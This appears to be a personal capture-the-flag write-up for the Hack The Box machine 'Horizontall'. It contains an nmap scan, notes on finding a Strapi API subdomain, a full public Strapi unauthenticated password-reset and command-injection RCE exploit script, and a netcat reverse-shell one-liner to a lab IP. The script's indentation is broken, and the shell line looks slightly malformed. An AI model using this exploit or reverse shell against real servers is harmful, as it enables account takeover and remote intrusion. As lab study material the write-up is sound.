# Horizontall 

## Foothold


###. 1 Nmap scan :

~~~php
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 12:13 EDT
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
~~~

Kinda stuck. Page doesn't present anything interactive. Bruteforcing directiories or subdomains also didnt work.

<Mark> Found a subdomain while checking the app code.. it was purely unintentional tho.. I should have known to focus on that js code when thats the only thing in sight </Mark> 

## api-prod.horizontall.htb - added to /etc/hosts/

Dirbusted that bich and we got a sing in form.. 


The form was not really of use. Instead, we find /admin/init, which gives us a 200 (OK) code and lets us see the version of Strapi. Googling for vulnerabilities, we find a convenient python script : 
~~~python
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)

# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3


import requests
import json
from cmd import Cmd
import sys


if len(sys.argv) != 2:
print("[-] Wrong number of arguments provided")
print("[*] Usage: python3 exploit.py <URL>\n")
sys.exit()
  

class Terminal(Cmd):
prompt = "$> "
def default(self, args):
code_exec(args)

def check_version():
global url
print("[+] Checking Strapi CMS Version running")
version = requests.get(f"{url}/admin/init").text
version = json.loads(version)
version = version["data"]["strapiVersion"]
if version == "3.0.0-beta.17.4":
print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
else:
print("[-] Version mismatch trying the exploit anyway")
  
def password_reset():
global url, jwt
session = requests.session()
params = {"code" : {"$gt":0},
"password" : "SuperStrongPassword1",
"passwordConfirmation" : "SuperStrongPassword1"
}
output = session.post(f"{url}/admin/auth/reset-password", json = params).text
response = json.loads(output)
jwt = response["jwt"]
username = response["user"]["username"]
email = response["user"]["email"]
if "jwt" not in output:
print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
sys.exit(1)
else:
print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
def code_exec(cmd):
global jwt, url
print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
headers = {"Authorization" : f"Bearer {jwt}"}
data = {"plugin" : f"documentation && $({cmd})",
"port" : "1337"}
out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
print(out.text)

  

if __name__ == ("__main__"):
url = sys.argv[1]
if url.endswith("/"):
url = url[:-1]
check_version()
password_reset()
terminal = Terminal()
terminal.cmdloop()
~~~
 * Note that identation is wrong. For a working version, check the files in CTF/HTB/Horizontall*


With this script , we gain RCE and ofc, a reverse shell. (tried the basic nc, python and bash, none worked, this worked tho :
~~~bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.152 1234/tmp/f
~~~

